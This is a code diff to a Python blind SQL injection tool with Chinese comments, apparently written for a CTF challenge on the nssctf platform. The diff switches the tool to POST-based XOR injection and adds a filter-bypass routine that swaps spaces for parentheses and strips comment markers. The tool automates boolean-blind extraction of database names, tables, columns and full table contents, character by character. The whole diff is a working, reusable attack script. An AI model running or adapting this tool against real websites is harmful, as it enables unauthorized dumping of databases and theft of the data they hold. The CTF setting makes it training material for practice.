@@ -1,25 +1,26 @@
 import time
-
+import re
 import numpy as np
 import pandas as pd
 import requests
 class mysql_blind():
     #配置参数：
-    way = 'get'
-    url = "http://node2.anna.nssctf.cn:28381/index.php"
+    way = 'post'
+    url = "http://node2.anna.nssctf.cn:28686/index.php"
     # 需要连接词的注入闭合语句
-    payload = "?id=-1' or "
+    payload = "id=0^("
     # 设置请求头
     header = {
         'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
         'Cookie':'security=low; _ga=GA1.1.449937272.1690901398; _ga_M95P3TTWJZ=GS1.1.1691754765.8.1.1691754884.0.0.0; PHPSESSID=e9kqr54fb6m509hul2f2gd2n65',
-        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
+        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Content-Type':'application/x-www-form-urlencoded'
     }
     #Cookie={'security':'low', 'PHPSESSID':'9p8upotqkiotcd7a6e6434v49d'}
     # 爆破字典
-    str = 'idpsargfwtlobnqeyuhjkzxcvm_1234567890-<= }{(+)>?/@$%^*'
+    str = 'idpsargfwtlobnqeyuhjkzxcvm_1234567890- }{(+)<=>?/@$%^*'
     # 页面正确回显的标志
-    web_flag = '没有提示...........'
+    web_flag = 'Hello,'
     length = 0
     #是否降低请求速度
     sleep=False
@@ -29,10 +30,10 @@ class mysql_blind():
         'http': 'http://127.0.0.1:8080',
         'https': 'http://127.0.0.1:8080'
     }
-    waf=False
+    waf=True
     #默认参数
-    db='test_db'
-
+    db='ctftraining'
+    #自定义waf函数
 
     def __init__(self):
         print("   ==========*******  starting  *********=========")
@@ -61,14 +62,38 @@ class mysql_blind():
 
     #设定绕waf的函数
     def beat_waf(self,payload):
-        pass
+        #print(payload)
+        fl=0
+        payload=re.sub(r'--','',payload)
+        res=''
+        for i in payload:
+            if i==' ':
+                if fl%2==0:
+                    res+='('
+                    fl+=1
+                else:
+                    res+=')'
+                    fl+=1
+            if i=='#':
+                res+=''
+            else:
+                res+=i
+        res=re.sub(r' ', '', res)
+        res = re.sub(r'limit\(0,1\)', '', res)
+        res = re.sub(r"g\)\)\)=", 'g))=', res)
+        if 'sub' in res:
+            res = re.sub(r"g\),", 'g)),', res)
+        if 'length' in res:
+            res = re.sub(r"g\)\)=", 'g)))=', res)
+        res+=')'
+        return res
 
 # 获取长度
     def count_len(self, type='', table_name='', column='', limit=0):
         key=''
         key=self.select_payload(type=type,table_name=table_name,column=column,limit=limit)
         for i in range(1,50):
-            payload = self.payload+"if(length({0})={1},1,0)  --+".format(key,i)
+            payload = self.payload+"if(length({0})={1},1,0)#--".format(key,i)
             res=self.http_query(payload)
             if self.web_flag in res.text:
                 self.length = i
@@ -86,20 +111,26 @@ class mysql_blind():
             print("[status]-- please wait")
         for i in range(1,length+1):
             for j in self.str:
-                payload = self.payload+"if(substring({0},{1},1)='{2}',1,0) --+".format(query,i, j)
+                payload = self.payload+"if(substring({0},{1},1)='{2}',1,0)#--".format(query,i, j)
                 res=self.http_query(payload)
+                if j in '-#':
+                    salt=self.payload+"if(ascii(substring({0},{1},1))={2},1,0)#--".format(query,i, ord(j))
+                    s=self.asciisql(j,salt=salt)
                 if self.web_flag in res.text:
                     s=j
                     if j in 'idpsardgfwtlobnqeyuhjkzxcvm':
-                        salt=self.payload+"if(ascii(substring({0},{1},1))={2},1,0) --+".format(query,i, ord(j)-32)
+                        salt=self.payload+"if(ascii(substring({0},{1},1))={2},1,0)#--".format(query,i, ord(j)-32)
                         s=self.asciisql(j,salt=salt)
-                    flag += s
-                    if type != 'content':
-                        print(s,"--",end='')
-                    else:
-                        print('.',end='')
-                    break
-
+                    if(s!=''):
+                        flag += s
+                        if type != 'content':
+                            print(s,"--",end='')
+                        else:
+                            print('.',end='')
+                        break
+            if(self.waf):
+                if(flag!=''):
+                    flag+='-'
         if type!='content':
             print()
             print("\033[32m[INFO]--\033[0m {0} query result: {1}   from ==={2} -database ==={3}==={4}===".format(type,flag,self.db,table_name,column))
@@ -114,11 +145,11 @@ class mysql_blind():
             query="(select count(column_name) from information_schema.columns where table_schema='{}' and table_name='{}')".format(
                     self.db, table_name)
         elif type=='content':
-            query="(select count({0}) from {1})".format(column,table_name)
+            query="(select count({0}) from {1} )".format(column,table_name)
         else:
             self.stu_error(type='args')
         for i in range(1,50):
-            payload=self.payload+"if({0}={1},1,0) --+".format(query,i)
+            payload=self.payload+"if({0}={1},1,0)#--".format(query,i)
             res=self.http_query(payload)
             if self.web_flag in res.text:
                 print("\033[32m[INFO]--\033[0m query {0} count is {1}".format(type,i))
@@ -127,10 +158,15 @@ class mysql_blind():
     #区分大小写
     def asciisql(self,j,salt):
         res=self.http_query(salt)
-        if self.web_flag in res.text:
-            return chr(ord(j)-32)
+        if j in '-#':
+            if self.web_flag in res.text:
+                return j
+            return ''
         else:
-            return j
+            if self.web_flag in res.text:
+                return chr(ord(j)-32)
+            else:
+                return j
     def select_payload(self,type, table_name='', column='', limit=0):
         query=''
         if type not in ['db', 'table', 'column', 'content']:
@@ -150,9 +186,11 @@ class mysql_blind():
 
     #统一发送请求接口
     def http_query(self,payload):
+        url=self.url
         if (self.waf):
             payload = self.beat_waf(payload)
-        url = self.url + payload
+        if(self.way=='get'):
+            url = self.url + payload
         if(self.sleep):
             time.sleep(0.3)
         if self.way == 'get':
@@ -162,9 +200,9 @@ class mysql_blind():
                 res = requests.get(url=url, headers=self.header)
         else:
             if (self.proxy):
-                res = requests.post(url=url, headers=self.header, data=payload, proxies=self.proxies)
+                res = requests.post(url=self.url, headers=self.header, data=payload, proxies=self.proxies)
             else:
-                res = requests.post(url=url, headers=self.header, data=payload)
+                res = requests.post(url=self.url, headers=self.header, data=payload)
         code = res.status_code
         if code!=200:
             self.stu_error("request",code)
@@ -199,11 +237,14 @@ class mysql_blind():
             elif type == 'content':#接收一个字典：{table:数据帧}
                 print('##############################################')
                 for table,content in data.items():
-                    print(table,':')
-                    print('-----------------------')
-                    print(content)
-                    print('-----------------------')
-                    print()
+                    if(content.empty):
+                        print("\033[31m[ERROR]-- no data,please check args\033[0m")
+                    else:
+                        print(table,':')
+                        print('-----------------------')
+                        print(content)
+                        print('-----------------------')
+                        print()
             else:
                 self.stu_error(type='args')
 
@@ -283,11 +324,12 @@ def get_current_db_data(ctfer):
 
     #爆出当前数据库所有数据
     for table,columns in table_columns.items():
-        table_content=[]
+        table_content={}
         for i in columns:
             col=get_column_data(ctfer,table_name=table,column_name=i)
-            table_content.append(col)
-        data[table]=pd.DataFrame(np.asarray(table_content))
+            for key,value in col.items():
+                table_content[key]=value
+        data[table]=pd.DataFrame(table_content)
     print()
     return data
 
@@ -342,9 +384,11 @@ if __name__=='__main__':
         data={}
         table_name = name_input('table')
         col=get_table_column(ctfer,table_name)
-        table_data=[]
+        table_data={}
         for i in col:
-            table_data.append(get_column_data(ctfer,table_name,i))
+            col=get_column_data(ctfer,table_name,i)
+            for key, value in col.items():
+                table_data[key] = value
         data[table_name]=pd.DataFrame(table_data)
         ctfer.show_data(data=data,type='content')
     elif n==6:
